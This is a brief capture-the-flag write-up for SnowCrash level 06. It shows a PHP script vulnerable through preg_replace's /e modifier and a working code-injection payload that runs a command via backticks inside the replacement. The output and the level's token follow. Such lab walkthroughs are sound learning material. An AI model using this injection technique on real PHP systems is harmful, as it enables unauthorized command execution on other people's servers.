# Level 06
Let's enumerate:

    level06@SnowCrash:~$ ls
    level06  level06.php
    level06@SnowCrash:~$ cat level06.php
    #!/usr/bin/php
    <?php
    function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
    function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
    $r = x($argv[1], $argv[2]); print $r;
    ?>
So this is a regex code that's replacing our argument to level06 by changing it, let's try an injection by formating our input:

    level06@SnowCrash:~$ echo '[x ${`/bin/getflag`}]' > /tmp/regex.txt
    level06@SnowCrash:~$ ./level06 /tmp/regex.txt
    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
